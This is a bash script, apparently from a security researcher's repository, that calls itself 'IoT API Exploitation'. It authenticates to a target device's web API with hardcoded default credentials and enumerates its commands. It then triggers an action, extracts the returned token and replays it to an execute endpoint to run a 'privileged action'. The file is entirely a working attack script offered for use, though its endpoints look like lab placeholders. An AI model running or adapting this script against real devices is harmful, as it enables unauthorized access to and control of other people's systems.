#!/bin/bash

# ============================================================
#  IoT_API_Device.sh - IoT API Exploitation
#  TheMalwareGuardian | github.com/TheMalwareGuardian
# ============================================================



# CONFIGURATION (EDIT HERE)

TARGET="$1"
PORT="$2"

# Authentication
API_LOGIN="/login"
AUTH_USER_FIELD="email"
AUTH_PASS_FIELD="password"

USERNAME="admin@example.local"
PASSWORD="changeme123"

# Endpoints
API_STATUS="/device"
API_COMMANDS="/device/commands"
API_ACTION="/device/action"
API_EXECUTE="/device/execute"
API_OUTPUT="/device/output"

# JSON fields
FIELD_DEVICE_ID="device_id"
FIELD_ACTION_KEY="token"

# Static values
DEVICE_ID="00000001"



# VALIDATION

if [ -z "$TARGET" ] || [ -z "$PORT" ]; then
	echo -e "\033[1;31mUsage:\033[0m $0 <target> <port>"
	exit 1
fi

BASE_URL="http://$TARGET:$PORT"



# Colors

BOLD=$'\033[1m'
RESET=$'\033[0m'
C_CYAN=$'\033[1;36m'
C_YELLOW=$'\033[1;33m'
C_GREEN=$'\033[1;32m'
C_RED=$'\033[1;31m'
C_BLUE=$'\033[1;34m'
C_MAGENTA=$'\033[1;35m'
C_WHITE=$'\033[1;37m'
C_DARK=$'\033[2;37m'



# BANNER

echo ""
echo -e "${C_YELLOW}${BOLD}"
echo "   █████╗ ██████╗ ██╗"
echo "  ██╔══██╗██╔══██╗██║"
echo "  ███████║██████╔╝██║"
echo "  ██╔══██║██╔═══╝ ██║"
echo "  ██║  ██║██║     ██║"
echo "  ╚═╝  ╚═╝╚═╝     ╚═╝"
echo -e "${RESET}"

echo -e "  ${C_DARK}IoT API Device Controller • TheMalwareGuardian${RESET}"
echo ""
echo -e "  ${C_WHITE}${BOLD}Target :${RESET} ${C_YELLOW}${BOLD}$TARGET:$PORT${RESET}"
echo ""



# 1. AUTHENTICATION

echo "[*] Authenticating..."

COOKIE=$(curl -s -i -X POST "$BASE_URL$API_LOGIN" -H "Content-Type: application/x-www-form-urlencoded" -d "$AUTH_USER_FIELD=$USERNAME&$AUTH_PASS_FIELD=$PASSWORD" | grep -i "Set-Cookie" | cut -d' ' -f2 | tr -d '\r')

if [ -z "$COOKIE" ]; then
	echo -e "\033[1;31m[-] Authentication failed\033[0m"
	exit 1
fi

echo -e "\033[1;32m[+] Session obtained:\033[0m $COOKIE"



# 2. DEVICE INFORMATION

echo ""
echo "[*] Retrieving device information..."

DEVICE_INFO=$(curl -s "$BASE_URL$API_STATUS" -H "Cookie: $COOKIE")

echo "$DEVICE_INFO" | jq . 2>/dev/null || echo "$DEVICE_INFO"



# 3. COMMAND ENUMERATION

echo ""
echo "[*] Enumerating available commands..."

COMMANDS=$(curl -s -X POST "$BASE_URL$API_COMMANDS" -H "Cookie: $COOKIE" -H "Content-Type: application/json" -d "{\"$FIELD_DEVICE_ID\":\"$DEVICE_ID\"}")

echo "$COMMANDS" | jq . 2>/dev/null || echo "$COMMANDS"



# 4. TRIGGER ACTION

echo ""
echo "[*] Triggering device action..."

ACTION_RESPONSE=$(curl -s -X POST "$BASE_URL$API_ACTION" -H "Cookie: $COOKIE" -H "Content-Type: application/json" -d "{\"$FIELD_DEVICE_ID\":\"$DEVICE_ID\"}")

echo "$ACTION_RESPONSE" | jq . 2>/dev/null || echo "$ACTION_RESPONSE"



# 5. EXTRACT ACTION KEY (FIXED)

ACTION_KEY=$(echo "$ACTION_RESPONSE" | jq -r "
	.$FIELD_ACTION_KEY //
	.status.$FIELD_ACTION_KEY //
	.data.$FIELD_ACTION_KEY //
	empty
" 2>/dev/null)

if [ -z "$ACTION_KEY" ] || [ "$ACTION_KEY" == "null" ]; then
	echo -e "\033[1;33m[!] No action key found, skipping execution\033[0m"
else
	echo -e "\033[1;32m[+] Extracted action key:\033[0m $ACTION_KEY"

	# 6. EXECUTE ACTION

	echo ""
	echo "[*] Executing privileged action..."

	EXEC_RESPONSE=$(curl -s -X POST "$BASE_URL$API_EXECUTE" -H "Cookie: $COOKIE" -H "Content-Type: application/json" -d "{\"$FIELD_DEVICE_ID\":\"$DEVICE_ID\",\"$FIELD_ACTION_KEY\":\"$ACTION_KEY\"}")

	echo "$EXEC_RESPONSE" | jq . 2>/dev/null || echo "$EXEC_RESPONSE"
fi



# 7. OUTPUT / ARTIFACT

echo ""
echo "[*] Retrieving output artifact..."

echo "  URL:"
echo "  $BASE_URL$API_OUTPUT"

echo ""
echo -e "\033[1;36m[+] IoT API exploitation completed.\033[0m"
echo ""
